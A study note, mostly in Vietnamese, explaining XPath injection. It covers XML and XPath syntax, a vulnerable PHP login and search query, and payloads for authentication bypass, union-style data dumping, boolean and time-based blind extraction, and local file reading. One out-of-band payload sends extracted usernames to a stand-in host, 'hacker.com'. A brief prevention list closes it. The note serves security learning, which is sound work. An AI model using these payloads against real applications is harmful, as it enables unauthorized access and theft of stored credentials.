# Summary

Tương tự như SQLi: bản chất của nó là user input được nối trực tiếp vào câu truy vấn mà không được santitize hay filter đúng cách, để khai thác được thì ta cần hiểu được syntax của đối tượng đấy. 

Khi thực hiện blackbox, đầu tiên cần phải hiểu về cấu trúc của câu truy vấn đấy ( tưởng tượng ra câu truy vấn được chạy bên phía server ) , sau đó thực hiện chèn cú pháp hợp lệ với cấu trúc đó để khai thác.

# XPath Injection

XPath is query language for XML document. 

## XML structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>                      // XML declaration, If it ommited, the XML parse assumes version 1.0 and encoding utf-8

// The data in XML document is formatted in a tree structure consisting of nodes

<academy_modules>                                           // root element node
    <module>                                                // module node
        <title>Web Attacks</title>
        <author>21y4d</author>
        <tier difficulty="medium">2</tier>                  // attribute nodes ( difficulty="medium")
        <category>offensive</category>
    </module>
    <!-- this is a comment -->                              // comment node
    <module>
        <title>Attacking Enterprise Networks</title>
        <author co-author="LTNB0B">mrb3n</author>
        <tier difficulty="medium">2</tier>
        <category>offensive</category>                      // text node (contain data from element nodes) - offensive
    </module>
</academy_modules>
```

## Query syntax:

| Query | Explanation |
|-------|--------------|
| / | chọn node gốc, bắt đầu tìm kiếm từ điểm cao nhất của document ( đường dẫn tuyệt đối ) |
| // | chọn nodes con cháu bắt đầu từ node hiện tại, không quan tâm nó ở độ sâu nào (duyệt toàn bộ document - đường dẫn tương đối ) |
| . | chọn node hiện tại |
| .. | chọn node cha của node hiện tại |
| @<attribute node> | chọn node thuộc tính của node hiện tại |
| text() | lấy text node của node hiện tại |
| [...] | Predicate: tương đương với where của SQL |
| \| | tương đương union của SQL |
| * | match any element node |
| @* | match any attributes node |
| node() | match any node |

Các function hay dùng trong predicate:
| Function | Explanation |
|---------|--------------|
| contains(A,B) | kiểm tra xem chuỗi A có chứa B không |
| starts-with(A,B) | Kiểm tra xem A có bắt đầu bằng B không |
| not(DK) | phủ định - lấy các node không thỏa mãn điều kiện bên trong |
| position() | lấy ra vị trí (chỉ số thứ tự của node ) trong danh sách - bắt đầu bằng 1 |
| last() | lấy ra phần tử cuối cùng trong danh sách |

Example:

`/academy_modules/module[1]/*/text()`: chọn tất cả các node văn bản (text node) của bất kỳ thẻ con nào nằm trực tiếp trong thẻ <module> đầu tiên

`//module[contains(tier/@difficulty,'med') and category='offensive']`: Tìm tất cả các thẻ <module> trên toàn bộ document thỏa mãn đồng thời 2 điều kiện: Có thuộc tính difficulty chứa chữ 'med' và có thẻ tên là <category> mang giá trị là 'offensive'

`//module[last()]/author[not(@*)]`: Tìm thẻ \<author\> của \<module\> cuối cùng trong danh sách, với điều kiện thẻ <author> đó không chứa bất kỳ thuộc tính nào (sử dụng phủ định not() và ký tự đại diện cho thuộc tính @*)

`../*[position()=3 and starts-with(text(),2)]`: Giả sử bạn đang đứng tại node hiện tại là \<title\> của module thứ 2 (có chữ 'Attacking...'). Hãy viết câu lệnh dùng nút cha (..) để quay ngược lên module đó, rồi tìm đến thẻ con nằm ở vị trí số 3 (position()=3) nếu thẻ đó có nội dung bắt đầu bằng số 2 (starts-with())

`//title | //comment()`: lấy tất cả title và comment node

`//@difficulty`: lấy tất cả difficulty attribute nodes (quét từ root)

## Exploit

Example vunlnerable code:

```php
# Authentication:

$query = "/users/user[username/text()= '" . $_POST['username'] . "and password/text()= '" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);

Exploit:
$_POST['username'] = ' or true() or ' -> login với first user ( thường dùng để confirm khi mà blackbox )
$_POST['username'] = ' or position()=2 or ' -> login với user thứ 2 trong document
$_POST['username'] = ' or contains(username,'admin') or ' -> login với user đầu tiên có chứa admin trong username
```

```xpath
# Search

$query = "/a/b/c[contains(d/streets='" ."$_POST['q']" . "')]/" . "$_POST['f']";
$result = $xml->xpath($query);

# Exfiltrating Data
$_POST['f'] = xyz | //text() -> returns all text node, | similar to UNION
$_POST['q'] = ') or '1'='1 và $_POST['f'] = ../../..//text() -> similar to above query
```

```xpath
# Advanced Data Exfiltration

Trường hợp Server giới hạn số lượng kết quả trả về, ta không thể dùng toán tử gộp `| //text()` để đọc toàn bộ tài liệu cùng một lúc. 
Ta bắt buộc phải dò tìm độ sâu của cấu trúc XML (Schema Depth) để bóc tách (iterator) từng node một.

Nguyên lý dò độ sâu (Schema Depth)
- Đi từ nút gốc bằng payload: `/*[1]`
- Do ứng dụng Web phía Backend (PHP) kỳ vọng nhận về dữ liệu dạng Chuỗi (String) nhưng câu lệnh /*[1] lại trả về một đối tượng Mảng (Array), ứng dụng không thể in ra dữ liệu và trả về phản hồi rỗng (Empty Response).
- Ta tiến hành tăng dần độ sâu bằng cách nối thêm các cụm /*[1] vào payload cho đến khi Server thay đổi hành vi (trả về dữ liệu chữ thay vì lỗi/rỗng):
  * Vòng 1: /*[1] -> Phản hồi rỗng
  * Vòng 2: /*[1]/*[1] -> Phản hồi rỗng
  * Vòng 3: /*[1]/*[1]/*[1] -> Phản hồi rỗng
  * Vòng 4: /*[1]/*[1]/*[1]/*[1] -> Có dữ liệu trả về! (Suy ra độ sâu cấu trúc của tập dữ liệu này là 4).

Chuyển qua bản ghi khác:
    /*[1]/*[1]/*[1]/*[2] hay /*[1]/*[2]/*[1]/*[1] -> từ đó ta có thể vét cạn toàn bộ document

Script auto:
...
...
...

```


Blind - các hàm hay dùng:

| Hàm | Ý nghĩa kỹ thuật | Ứng dụng thực tế trong Blind Injection |
| :--- | :--- | :--- |
| **`name(.)`** | Lấy ra **tên thẻ** (Tag Name) của node hiện tại. | Dùng để dò đoán xem thẻ Root hoặc các thẻ con tên là gì khi không có mã nguồn. |
| **`string-length(chuỗi)`** | Trả về **độ dài (số ký tự)** của chuỗi. | Dùng để hỏi Server xem độ dài của chuỗi (mật khẩu/username/tên thẻ) bằng bao nhiêu trước khi dò từng chữ. |
| **`substring(chuỗi, start, len)`** | Cắt chuỗi từ vị trí `start` với độ dài `len`. **(Tính từ số 1)**. | Dùng để cô lập và bẻ khóa từng ký tự một (Ví dụ: kiểm tra xem ký tự thứ nhất của mật khẩu có phải là 'a' không). |
| **`count(tập_hợp_node)`** | Đếm **số lượng node** thỏa mãn đường dẫn. | Dùng để đếm xem hệ thống có tổng cộng bao nhiêu tài khoản (bản ghi), hoặc một thẻ có bao nhiêu thẻ con. |

**Note:** Vì các hàm trên trả về giá trị dạng Chuỗi hoặc Số, khi chèn Payload cần **phải đẩy chúng vào trong dấu ngoặc vuông `[...]` làm phép so sánh logic (Bằng, Lớn hơn, Nhỏ hơn)** để tránh bị lỗi lệch kiểu dữ liệu (Mismatch) và nhận biết kết quả qua phản hồi Đúng/Sai từ Server.

```xpath
Boolean-based:
$query = "/users/user[username='<input>']"

-> input = invalid' or string-length(name(/*[1]))=1 and '1'='1 -> guess length of root node name
-> input = invalid' or substring(name(/*[1]),1,1)='a -> guess character by character of root node name
-> input = invalid' or count(/users/*)=1 and '1'='1 -> guess the number of child nodes

script: 
...
...
...

Time-based: 
count((//.)[count((//.))]) hay count(//.*[count(//.*[count(//.*)])]), ... tùy thuộc vào độ lớn của tài liệu XML

-> input = invalid' or substring(/users/user/password[1],1,1)='a' and count((//.)[count((//.))]) and '1'='1 
-> if comparison return true -> vế count sau and được kích hoạt -> delay
-> và ngược lại
```
```xpath
OOB:
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to

readfile:
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```

```
Hướng:
Nếu là authentication bypass -> thực hiện theo hướng authen
Nếu là exfilitration data: có union //text() để lấy được tất cả data không -> advanced exfiltrating -> OOB (if can) -> blind boolean -> blind time
Ngoài hiểu về cấu trúc của câu truy vấn, ta còn cần phải đoán để hiểu được cấu trúc của XML document
```

## Tools: xcat

# Prevention

- Whitelist character in user input if can ( ưu tiên )
- Using blacklist: ', ", @, =, *, [, ], (, ), /


